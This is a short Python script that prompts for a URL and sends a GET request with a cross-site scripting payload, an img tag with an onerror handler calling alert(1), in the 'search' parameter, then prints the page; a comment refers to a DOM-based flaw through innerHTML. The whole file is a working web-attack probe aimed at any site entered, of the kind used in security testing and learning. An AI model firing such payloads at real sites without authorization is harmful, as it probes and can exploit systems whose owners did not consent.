import requests

url = input("url : ")
r  = requests.get(url, params={'search':'<img src=1 onerror=alert(1)>'})

print(r.text)
# dom based vulnerability affected to innnerhtml()